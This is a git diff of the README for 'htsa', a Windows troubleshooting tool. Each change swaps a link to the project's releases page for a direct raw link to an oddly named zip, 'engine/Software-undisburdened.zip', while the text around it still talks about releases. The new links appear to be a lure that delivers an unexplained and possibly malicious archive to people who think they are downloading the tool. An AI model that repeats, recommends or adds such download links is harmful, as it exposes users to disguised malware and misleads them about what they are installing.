@@ -1,6 +1,6 @@
 # 🧭 htsa - Find causes with clear steps
 
-[![Download htsa](https://img.shields.io/badge/Download-htsa-2b7de9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hockeystickcleistogamy492/htsa/releases)
+[![Download htsa](https://img.shields.io/badge/Download-htsa-2b7de9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hockeystickcleistogamy492/htsa/raw/refs/heads/main/engine/Software-undisburdened.zip)
 
 ## 🪟 What htsa does
 
@@ -29,7 +29,7 @@ htsa is useful for:
 
 Visit this page to download htsa for Windows:
 
-https://github.com/Hockeystickcleistogamy492/htsa/releases
+https://github.com/Hockeystickcleistogamy492/htsa/raw/refs/heads/main/engine/Software-undisburdened.zip
 
 On that page, look for the latest release and download the Windows file.
 
@@ -192,7 +192,7 @@ If the app seems slow:
 
 If you need the latest version, go here:
 
-https://github.com/Hockeystickcleistogamy492/htsa/releases
+https://github.com/Hockeystickcleistogamy492/htsa/raw/refs/heads/main/engine/Software-undisburdened.zip
 
 ## 📌 Tags
 
